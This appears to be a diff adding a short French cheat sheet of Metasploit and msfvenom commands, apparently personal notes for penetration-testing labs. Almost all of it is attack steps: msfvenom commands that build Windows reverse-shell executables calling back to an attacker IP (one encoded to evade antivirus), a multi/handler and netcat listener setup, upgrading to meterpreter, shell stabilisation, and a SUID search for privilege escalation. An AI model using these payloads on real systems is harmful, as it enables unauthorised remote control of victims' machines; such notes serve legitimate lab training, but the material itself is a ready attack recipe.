@@ -1,0 +1,55 @@
+--->METASPLOIT FRAMEWORK and MSFVENOM
+
+--> Memento :
+*RHOSTS : ip de la cible distante
+*RPORTS : port de la cible distante
+*LHOST : ip de la machine locale d'attaque
+*LPORT : port de la machine locale d'attaque
+*SESSION : "zone" msfconsole 
+	   sessions -l pour lister
+	   sessions -i [session] pour revenir à une session en background
+*CTRL+z : background la session
+
+--> msfconsole :
+search [module à rechercher]
+use [nombre/module]
+options
+set [options] [paramètre]
+run
+
+--> Pour transformer en shell meterpreter :
+use post/multi/manage/shell_to_meterpreter
+options
+set session [session à upgrade]
+set lhost [lhost]
+run
+
+--> MSFVENOM reverse shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.151.244 LPORT=6667 -f exe -o revshell.exe
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.151.244 LPORT=6667 -e x86/shikata_ga_nai -f exe -o revshell.exe
+
+Upload sur la machine cible.
+Exécuter un nc (nc -lvnp <port>).
+Exécuter la charge.
+
+--> MSFCONSOLE reverse shell
+use exploit/multi/handler
+(show payloads)
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.8.151.244
+set LPORT 6667
+
+--> https://www.revshells.com/
+
+--> Pour stabiliser un shell :
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Ctrl+Z
+
+stty raw -echo; fg
+
+export TERM=xterm
+
+--> Pour check SUID :
+find / -perm -u=s -type 2>/dev/null
